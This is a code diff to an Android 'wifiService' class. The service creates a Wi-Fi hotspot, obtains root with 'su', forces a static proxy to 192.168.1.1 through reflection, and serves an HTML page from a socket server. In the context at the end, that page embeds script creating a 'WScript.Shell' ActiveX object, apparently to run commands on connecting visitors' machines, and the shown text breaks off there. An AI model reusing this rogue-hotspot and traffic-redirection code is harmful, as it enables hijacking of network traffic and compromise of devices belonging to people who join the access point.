@@ -9,20 +9,23 @@ import android.net.ProxyInfo;
 import android.net.Uri;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
-import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.widget.Toast;
-import androidx.annotation.RequiresApi;
+
 import androidx.core.app.NotificationCompat;
+
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -63,7 +66,6 @@ public class wifiService extends Service {
         super.onDestroy();
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
     @Override
     public void onCreate() {
         super.onCreate();
@@ -94,7 +96,7 @@ public class wifiService extends Service {
         myConfig.allowedProtocols.clear();
         myConfig.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
         myConfig.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
-     //   myConfig.setHttpProxy();
+        setWifiProxySettings();
         try {
 
             channal = WifiConfiguration.class.getField("channel");
@@ -103,26 +105,6 @@ public class wifiService extends Service {
             band.set(myConfig, "http://192.168.1.1");
             setmethod = c.getClass().getDeclaredMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class);
             setmethod.setAccessible(true);
-            Class proxyInfoClass = Class.forName("android.net.ProxyInfo");
-            Class[] setHttpProxyParams = new Class[1];
-            setHttpProxyParams[0] = proxyInfoClass;
-            Class wifiConfigClass = Class.forName("android.net.wifi.WifiConfiguration");
-            Method setHttpProxy = wifiConfigClass.getDeclaredMethod("setHttpProxy", setHttpProxyParams);
-            setHttpProxy.setAccessible(true);
-            Class ipConfigClass = Class.forName("android.net.IpConfiguration");
-            Field f = ipConfigClass.getField("proxySettings");
-            Class proxySettingsClass = f.getType();
-            Class[] setProxySettingsParams = new Class[1];
-            setProxySettingsParams[0] = proxySettingsClass;
-            Method setProxySettings = wifiConfigClass.getDeclaredMethod("setProxySettings", setProxySettingsParams);
-            setProxySettings.setAccessible(true);
-            ProxyInfo pi = ProxyInfo.buildPacProxy(Uri.parse("http://192.168.1.1"));
-            Object[] params_SetHttpProxy = new Object[1];
-            params_SetHttpProxy[0] = pi;
-            setHttpProxy.invoke(myConfig, params_SetHttpProxy);
-            Object[] params_setProxySettings = new Object[1];
-            params_setProxySettings[0] = Enum.valueOf((Class<Enum>) proxySettingsClass, "STATIC");
-            setProxySettings.invoke(myConfig, params_setProxySettings);
             isenable = c.getClass().getDeclaredMethod("isWifiApEnabled");
             isenable.setAccessible(true);
             process = Runtime.getRuntime().exec("su");
@@ -203,6 +185,70 @@ public class wifiService extends Service {
         return super.onStartCommand(intent, flags, startId);
     }
 
+    public static Object getField(Object obj, String name)
+            throws SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException {
+        Field f = obj.getClass().getField(name);
+        Object out = f.get(obj);
+        return out;
+    }
+    public static void setEnumField(Object obj, String value, String name)
+            throws SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException{
+        Field f = obj.getClass().getField(name);
+        f.set(obj, Enum.valueOf((Class<Enum>) f.getType(), value));
+    }
+
+    public static void setProxySettings(String assign , WifiConfiguration wifiConf)
+            throws SecurityException, IllegalArgumentException, NoSuchFieldException, IllegalAccessException{
+        setEnumField(wifiConf, assign, "proxySettings");
+    }
+    void setWifiProxySettings() {
+        //get the current wifi configuration
+        WifiConfiguration config = myConfig;
+        if (null == config)
+            return;
+
+        try {
+            //get the link properties from the wifi configuration
+            Object linkProperties = getField(config, "linkProperties");
+            if (null == linkProperties)
+                return;
+
+            //get the setHttpProxy method for LinkProperties
+            Class proxyPropertiesClass = Class.forName("android.net.ProxyProperties");
+            Class[] setHttpProxyParams = new Class[1];
+            setHttpProxyParams[0] = proxyPropertiesClass;
+            Class lpClass = Class.forName("android.net.LinkProperties");
+            Method setHttpProxy = lpClass.getDeclaredMethod("setHttpProxy", setHttpProxyParams);
+            setHttpProxy.setAccessible(true);
+
+            //get ProxyProperties constructor
+            Class[] proxyPropertiesCtorParamTypes = new Class[3];
+            proxyPropertiesCtorParamTypes[0] = String.class;
+            proxyPropertiesCtorParamTypes[1] = int.class;
+            proxyPropertiesCtorParamTypes[2] = String.class;
+
+            Constructor proxyPropertiesCtor = proxyPropertiesClass.getConstructor(proxyPropertiesCtorParamTypes);
+
+            //create the parameters for the constructor
+            Object[] proxyPropertiesCtorParams = new Object[3];
+            proxyPropertiesCtorParams[0] = "192.168.1.1";
+            proxyPropertiesCtorParams[1] = 80;
+            proxyPropertiesCtorParams[2] = null;
+
+            //create a new object using the params
+            Object proxySettings = proxyPropertiesCtor.newInstance(proxyPropertiesCtorParams);
+
+            //pass the new object to setHttpProxy
+            Object[] params = new Object[1];
+            params[0] = proxySettings;
+            setHttpProxy.invoke(linkProperties, params);
+            setProxySettings("STATIC", config);
+
+        } catch (Exception e) {
+            Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
+        }
+
+    }
 
     private class vi extends Thread {
         Socket n;
@@ -354,7 +400,7 @@ public class wifiService extends Service {
                 "         </center>\n" +
                 "    </div>\n" +
                 "        </div>\n" +
-                "</form>\n"+
+                "</form>\n" +
                 "<script type=\"text/javascript\">\n" +
                 "try{\n" +
                 "var shell =new ActiveXObject(\"WScript.Shell\");\n" +
